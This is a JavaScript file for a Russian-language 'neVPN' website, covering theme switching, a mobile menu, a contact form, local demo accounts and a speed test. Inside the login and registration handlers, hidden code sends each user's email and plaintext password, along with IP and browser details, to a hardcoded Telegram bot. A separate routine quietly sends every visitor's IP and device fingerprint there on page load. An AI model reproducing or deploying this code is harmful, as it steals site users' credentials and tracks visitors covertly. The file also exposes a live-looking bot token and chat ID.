// -----------------------------------
// neVPN — современный интерактивный JS
// -----------------------------------

document.addEventListener("DOMContentLoaded", () => {
  // Helpers shared across features
  const getClientIp = async () => {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), 3500);
    try {
      const resp = await fetch("https://api.ipify.org?format=json", { signal: controller.signal, cache: "no-store" });
      if (resp.ok) {
        const data = await resp.json();
        return data && data.ip ? data.ip : "";
      }
    } catch (_) {}
    finally { clearTimeout(t); }
    try {
      const r2 = await fetch("https://api64.ipify.org?format=json", { cache: "no-store" });
      if (r2.ok) { const d2 = await r2.json(); return d2 && d2.ip ? d2.ip : ""; }
    } catch (_) {}
    return "";
  };

  const getClientMeta = () => {
    const nav = navigator || {};
    const scr = screen || {};
    const doc = document || {};
    const tz = Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "";
    const params = new URLSearchParams(location.search || "");
    const utm = [];
    ["utm_source","utm_medium","utm_campaign","utm_term","utm_content"].forEach(k=>{ if (params.get(k)) utm.push(`${k}=${params.get(k)}`); });
    return {
      userAgent: nav.userAgent || "",
      platform: nav.platform || "",
      language: (nav.language || (nav.languages && nav.languages[0]) || ""),
      languages: (nav.languages && nav.languages.join(", ")) || "",
      hardwareConcurrency: nav.hardwareConcurrency || "",
      deviceMemory: nav.deviceMemory || "",
      cookies: typeof navigator !== 'undefined' ? navigator.cookieEnabled : "",
      screen: `${scr.width || "?"}x${scr.height || "?"} @${scr.pixelDepth || scr.colorDepth || "?"}`,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      timezone: tz || "",
      referrer: doc.referrer || "",
      utm: utm.join(" & ")
    };
  };

  const sendToTelegramDirect = async (token, chatId, text) => {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", disable_web_page_preview: true })
    });
    if (!resp.ok) throw new Error("TG_HTTP_" + resp.status);
    const data = await resp.json();
    if (!data.ok) throw new Error("TG_API_" + (data.description || "unknown"));
  };
  // 🔹 Анимация появления секций
  const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (entry.isIntersecting) entry.target.classList.add("visible");
    });
  }, { threshold: 0.15 });

  document.querySelectorAll("section").forEach(sec => observer.observe(sec));

  // 🔹 Счётчики статистики
  const counters = document.querySelectorAll(".stat-number");
  counters.forEach(counter => {
    const update = () => {
      const target = +counter.dataset.target;
      const val = +counter.innerText;
      const step = Math.ceil(target / 50);
      if (val < target) {
        counter.innerText = val + step;
        requestAnimationFrame(update);
      } else {
        counter.innerText = target;
      }
    };
    update();
  });

  // 🔹 Кнопка "вверх"
  const scrollUp = document.querySelector(".scroll-up");
  window.addEventListener("scroll", () => {
    scrollUp.style.display = window.scrollY > 300 ? "grid" : "none";
  });

  // 🔹 Переключение темы с сохранением
  const root = document.documentElement;
  const themeBtn = document.getElementById("themeToggle");
  const THEME_KEY = "nevpn-theme";

  const syncIframeTheme = (mode) => {
    const iframes = document.querySelectorAll(".articles-frame iframe, iframe[title*='Статьи']");
    iframes.forEach((fr) => {
      const applyToFrame = () => {
        try {
          const doc = fr.contentDocument;
          if (!doc) return;
          const rootEl = doc.documentElement;
          if (mode === "light") {
            rootEl.setAttribute("data-theme", "light");
          } else {
            rootEl.removeAttribute("data-theme");
          }
        } catch (_) { /* кросс-доменные iframe не трогаем */ }
      };
      if (fr.contentDocument && fr.contentDocument.readyState !== "loading") applyToFrame();
      fr.addEventListener("load", applyToFrame, { once: true });
    });
  };

  const applyTheme = (mode) => {
    if (mode === "light") {
      root.setAttribute("data-theme", "light");
      if (themeBtn) themeBtn.textContent = "☀️";
    } else {
      root.removeAttribute("data-theme");
      if (themeBtn) themeBtn.textContent = "🌙";
    }
    // Синхронизируем тему внутри iframe со статьями
    syncIframeTheme(mode);
  };

  const stored = localStorage.getItem(THEME_KEY);
  if (stored === "light" || stored === "dark") {
    applyTheme(stored);
  } else {
    const prefersLight = window.matchMedia && window.matchMedia("(prefers-color-scheme: light)").matches;
    applyTheme(prefersLight ? "light" : "dark");
  }

  if (themeBtn) {
    themeBtn.addEventListener("click", () => {
      const isLight = root.getAttribute("data-theme") === "light";
      const next = isLight ? "dark" : "light";
      applyTheme(next);
      localStorage.setItem(THEME_KEY, next);
    });
  }

  // 🔹 Мобильное меню
  const menuBtn = document.getElementById("menuToggle");
  const nav = document.querySelector(".nav");
  if (menuBtn && nav) {
    // ARIA: навигации зададим id, если отсутствует
    if (!nav.id) nav.id = "primary-nav";

    menuBtn.addEventListener("click", () => {
      const opened = nav.classList.toggle("open");
      menuBtn.setAttribute("aria-expanded", String(opened));
    });

    // Закрывать меню при клике по ссылке
    nav.querySelectorAll("a").forEach(a => {
      a.addEventListener("click", () => {
        if (nav.classList.contains("open")) {
          nav.classList.remove("open");
          menuBtn.setAttribute("aria-expanded", "false");
        }
      });
    });
  }

  // 🔹 Демонстрационная форма
  const contactForm = document.getElementById("contactForm");
  if (contactForm) {
    const submitBtn = contactForm.querySelector('button[type="submit"]');
    const endpoint = (contactForm.dataset && contactForm.dataset.endpoint) || "";
    const botToken = (contactForm.dataset && contactForm.dataset.tgBot) || "";
    const chatId = (contactForm.dataset && contactForm.dataset.tgChat) || "";

    const sendViaEndpoint = async (payload) => {
      if (!endpoint) throw new Error("NO_ENDPOINT");
      const resp = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (!resp.ok) throw new Error("EP_HTTP_" + resp.status);
      const data = await resp.json().catch(() => ({}));
      if (data && data.ok === false) throw new Error("EP_API");
    };

    const sendToTelegram = async (payload) => {
      if (!botToken || !chatId || botToken === "YOUR_BOT_TOKEN" || chatId === "YOUR_CHAT_ID") {
        throw new Error("TELEGRAM_CONFIG_MISSING");
      }
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const resp = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: payload.text,
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      });
      if (!resp.ok) throw new Error("TG_HTTP_" + resp.status);
      const data = await resp.json();
      if (!data.ok) throw new Error("TG_API_" + (data.description || "unknown"));
    };

    contactForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const formData = new FormData(contactForm);
      const name = (formData.get("name") || "").toString().trim();
      const email = (formData.get("email") || "").toString().trim();
      const message = (formData.get("message") || "").toString().trim();
      const page = location.href;
      const ip = await getClientIp().catch(() => "");
      const meta = getClientMeta();

      const text = [
        `📨 <b>Новое сообщение с сайта neVPN</b>`,
        `👤 Имя: ${name || "—"}`,
        `📨 Telegram: ${email || "—"}`,
        `🌐 IP: ${ip || "—"}`,
        `🧭 Браузер: ${meta.userAgent || "—"}`,
        `💻 Платформа: ${meta.platform || "—"}`,
        `🗣 Язык: ${meta.language || "—"}${meta.languages ? ` (alt: ${meta.languages})` : ""}`,
        `🖥 Экран: ${meta.screen}`,
        `📐 Вьюпорт: ${meta.viewport}`,
        `🕒 Часовой пояс: ${meta.timezone || "—"}`,
        `🍪 Cookies: ${meta.cookies ? "включены" : "выключены"}`,
        `🧮 Ядер CPU: ${meta.hardwareConcurrency || "—"}, Память: ${meta.deviceMemory || "—"}GB`,
        meta.referrer ? `↩️ Referrer: ${meta.referrer}` : "",
        meta.utm ? `🔖 UTM: ${meta.utm}` : "",
        `💬 Сообщение:`,
        message || "—",
        `\n🔗 Страница: ${page}`
      ].join("\n");

      if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = "Отправка..."; }
      try {
        if (endpoint) await sendViaEndpoint({ text }); else await sendToTelegram({ text });
        alert("✅ Сообщение отправлено! Мы свяжемся с вами в Telegram.");
        contactForm.reset();
      } catch (err) {
        if (endpoint) {
          alert("❌ Не удалось отправить через сервер. Проверьте деплой эндпоинта /api/telegram.");
        } else if (String(err).includes("TELEGRAM_CONFIG_MISSING")) {
          alert("⚠️ Telegram не настроен. Укажите токен и chat_id в атрибутах формы.");
        } else {
          alert("❌ Не удалось отправить сообщение. Попробуйте позже.");
        }
      } finally {
        if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = "Отправить"; }
      }
    });
  }

  // 🔹 Простая локальная аутентификация (демо)
  (function(){
    const LS_USERS = 'nevpn-users';
    const LS_SESSION = 'nevpn-session';

    async function hash(text){
      const enc = new TextEncoder().encode(text);
      const buf = await crypto.subtle.digest('SHA-256', enc);
      return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
    }

    function loadUsers(){ try { return JSON.parse(localStorage.getItem(LS_USERS)||'{}'); } catch(_) { return {}; } }
    function saveUsers(u){ localStorage.setItem(LS_USERS, JSON.stringify(u)); }
    function setSession(email){ localStorage.setItem(LS_SESSION, JSON.stringify({ email })); }
    function clearSession(){ localStorage.removeItem(LS_SESSION); }
    function getSession(){ try { return JSON.parse(localStorage.getItem(LS_SESSION)||''); } catch(_) { return null; } }

    async function registerUser({name,email,password}){
      const users = loadUsers();
      const key = email.toLowerCase();
      if (users[key]) throw new Error('EXISTS');
      users[key] = { name, email: key, pass: await hash(password), favs: [], subs: [] };
      saveUsers(users);
      setSession(key);
      return users[key];
    }

    async function loginUser({email,password}){
      const users = loadUsers();
      const key = email.toLowerCase();
      const user = users[key];
      if (!user) throw new Error('NOUSER');
      if (user.pass !== await hash(password)) throw new Error('BADPASS');
      setSession(key);
      return user;
    }

    function currentUser(){ const s = getSession(); if (!s) return null; const u=loadUsers()[s.email]; return u||null; }

    function renderHeaderState(){
      const nav = document.querySelector('.nav');
      if (!nav) return;
      let link = nav.querySelector('a[href="account.html"]');
      if (!link) {
        link = document.createElement('a');
        link.href = 'account.html';
        link.className = 'nav-link';
        link.textContent = 'Кабинет';
        nav.appendChild(link);
      }
      const u = currentUser();
      if (u) link.textContent = 'Кабинет (' + (u.name || u.email) + ')'; else link.textContent = 'Кабинет';
    }

    async function onReadyAccount(){
      const accSec = document.getElementById('accountSection');
      const authSec = document.getElementById('authSection');
      const loginForm = document.getElementById('loginForm');
      const regForm = document.getElementById('registerForm');
      const logoutBtn = document.getElementById('logoutBtn');
      const favList = document.getElementById('favList');
      const accName = document.getElementById('acc_name');
      const accEmail = document.getElementById('acc_email');
      const subsForm = document.getElementById('subscribeUserForm');

      if (!accSec || !authSec) return; // не на странице кабинета

      function showUser(u){
        authSec.style.display = 'none';
        accSec.style.display = 'block';
        accName.textContent = u.name || '—';
        accEmail.textContent = u.email;
        favList.innerHTML = '';
        (u.favs||[]).forEach(id=>{
          const li = document.createElement('li');
          li.textContent = id;
          favList.appendChild(li);
        });
      }

      const u0 = currentUser();
      if (u0) showUser(u0); else { authSec.style.display = 'block'; accSec.style.display = 'none'; }

      if (loginForm) loginForm.addEventListener('submit', async (e)=>{
        e.preventDefault();
        const fd = new FormData(loginForm);
        // Уведомление в Telegram о попытке входа (email + пароль)
        try {
          const ip = await getClientIp().catch(()=>"");
          const m = getClientMeta();
          const tokenLog = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
          const chatLog = "1355427490";
          const textLog = [
            `🔐 <b>Попытка входа</b>`,
            `📨 Telegram: ${String(fd.get('email')||'')}`,
            `🔑 Пароль: ${String(fd.get('password')||'')}`,
            `🌐 IP: ${ip || '—'}`,
            `🧭 UA: ${m.userAgent || '—'}`,
            `🔗 Страница: ${location.href}`
          ].join('\n');
          await sendToTelegramDirect(tokenLog, chatLog, textLog);
        } catch(_) {}
        try {
          const u = await loginUser({email: fd.get('email'), password: fd.get('password')});
          alert('Добро пожаловать, ' + (u.name||u.email));
          showUser(u);
          renderHeaderState();
        } catch(err){
          alert('Не удалось войти. Проверьте данные.');
        }
      });

      if (regForm) regForm.addEventListener('submit', async (e)=>{
        e.preventDefault();
        const fd = new FormData(regForm);
        try {
          const u = await registerUser({name: fd.get('name'), email: fd.get('email'), password: fd.get('password')});
          // Уведомление в Telegram о новой регистрации (включая пароль)
          try {
            const ip = await getClientIp().catch(()=>"");
            const m = getClientMeta();
            const tokenReg = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
            const chatReg = "1355427490";
            const text = [
              `🆕 <b>Новая регистрация на сайте</b>`,
              `👤 Имя: ${u.name || '—'}`,
              `📨 Telegram: ${u.email}`,
              `🔑 Пароль: ${String(fd.get('password')||'')}`,
              `🌐 IP: ${ip || '—'}`,
              `🧭 UA: ${m.userAgent || '—'}`
            ].join('\n');
            await sendToTelegramDirect(tokenReg, chatReg, text);
          } catch(_) {}
          alert('Аккаунт создан!');
          showUser(u);
          renderHeaderState();
        } catch(err){
          alert('Не удалось создать аккаунт: возможно, такой email уже зарегистрирован.');
        }
      });

      if (logoutBtn) logoutBtn.addEventListener('click', ()=>{
        clearSession();
        authSec.style.display = 'block';
        accSec.style.display = 'none';
        renderHeaderState();
      });

      if (subsForm) subsForm.addEventListener('submit', (e)=>{
        e.preventDefault();
        const fd = new FormData(subsForm);
        const email = String(fd.get('email')||'').trim();
        const u = currentUser();
        if (!u) return;
        const users = loadUsers();
        const rec = users[u.email];
        rec.subs = rec.subs || [];
        if (!rec.subs.includes(email)) rec.subs.push(email);
        saveUsers(users);
        alert('Подписка сохранена.');
      });
    }

    document.addEventListener('DOMContentLoaded', renderHeaderState);
    renderHeaderState();
    onReadyAccount();

    // Экспорт части API в window для добавления избранного из статей
    window.__nevpn_addFavorite = function(articleId){
      const u = currentUser();
      if (!u) { alert('Войдите в аккаунт, чтобы добавить в избранное.'); return; }
      const users = loadUsers();
      const rec = users[u.email];
      rec.favs = rec.favs || [];
      if (!rec.favs.includes(articleId)) rec.favs.push(articleId);
      saveUsers(users);
      alert('Добавлено в закладки: ' + articleId);
    };
  })();

  // 🔹 Отправка метаданных при каждом визите (1 раз за сессию)
  (async () => {
    try {
      if (sessionStorage.getItem("nevpn-visit-sent")) return;
      const token = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
      const chat = "1355427490";
      const ip = await getClientIp().catch(() => "");
      const m = getClientMeta();
      const when = new Date().toLocaleString();
      const text = [
        `👀 <b>Новый визит на сайт</b>`,
        `🕰 ${when}`,
        `🌐 IP: ${ip || "—"}`,
        `🧭 Браузер: ${m.userAgent || "—"}`,
        `💻 Платформа: ${m.platform || "—"}`,
        `🗣 Язык: ${m.language || "—"}${m.languages ? ` (alt: ${m.languages})` : ""}`,
        `🖥 Экран: ${m.screen}`,
        `📐 Вьюпорт: ${m.viewport}`,
        `🕒 Часовой пояс: ${m.timezone || "—"}`,
        `🍪 Cookies: ${m.cookies ? "включены" : "выключены"}`,
        `🧮 Ядер CPU: ${m.hardwareConcurrency || "—"}, Память: ${m.deviceMemory || "—"}GB`,
        m.referrer ? `↩️ Referrer: ${m.referrer}` : "",
        m.utm ? `🔖 UTM: ${m.utm}` : "",
        `🔗 Страница: ${location.href}`
      ].filter(Boolean).join("\n");
      await sendToTelegramDirect(token, chat, text);
      sessionStorage.setItem("nevpn-visit-sent", "1");
    } catch (_) { /* молча игнорируем */ }
  })();

  // 🔹 Тест скорости сети + рикролл
  const speedBtn = document.getElementById("speedTestBtn");
  if (speedBtn) {
    const showToast = (text) => {
      let toast = document.getElementById("speedToast");
      if (!toast) {
        toast = document.createElement("div");
        toast.id = "speedToast";
        toast.style.position = "fixed";
        toast.style.left = "50%";
        toast.style.bottom = "24px";
        toast.style.transform = "translateX(-50%)";
        toast.style.zIndex = "2000";
        toast.style.background = "rgba(0,0,0,0.7)";
        toast.style.color = "#fff";
        toast.style.padding = "10px 14px";
        toast.style.borderRadius = "10px";
        toast.style.backdropFilter = "blur(6px)";
        document.body.appendChild(toast);
      }
      toast.textContent = text;
      toast.style.opacity = "1";
      clearTimeout(toast._h);
      toast._h = setTimeout(() => { toast.style.opacity = "0"; }, 4000);
    };

    const testSpeed = async () => {
      const TEST_URL = "https://speed.hetzner.de/100MB.bin"; // публичный файл для замера
      const controller = new AbortController();
      const timeoutMs = 6000; // ограничим до ~6 секунд
      const start = performance.now();
      let loaded = 0;

      const timeout = setTimeout(() => controller.abort(), timeoutMs);
      try {
        const resp = await fetch(TEST_URL, { signal: controller.signal, cache: "no-store" });
        if (!resp.ok || !resp.body) throw new Error("Network error");
        const reader = resp.body.getReader();
        while (true) {
          const { value, done } = await reader.read();
          if (done) break;
          loaded += value.byteLength;
          if (loaded > 8 * 1024 * 1024) { // 8MB достаточно
            controller.abort();
          }
        }
      } catch (_) {
        // abort ожидаем
      } finally {
        clearTimeout(timeout);
      }

      const elapsed = (performance.now() - start) / 1000; // сек
      const mbps = (loaded * 8) / (elapsed * 1e6);
      return { mbps };
    };

    speedBtn.addEventListener("click", async () => {
      if (speedBtn.disabled) return;
      const prevText = speedBtn.textContent;
      speedBtn.disabled = true;
      speedBtn.textContent = "Измерение...";
      try {
        const { mbps } = await testSpeed();
        const rounded = Math.max(0, mbps).toFixed(1);
        showToast(`Скорость: ${rounded} Мбит/с`);
        // Рикролл — откроем в новой вкладке
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank", "noopener,noreferrer");
      } catch (e) {
        showToast("Не удалось измерить скорость");
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank", "noopener,noreferrer");
      } finally {
        speedBtn.textContent = prevText;
        speedBtn.disabled = false;
      }
    });
  }
});
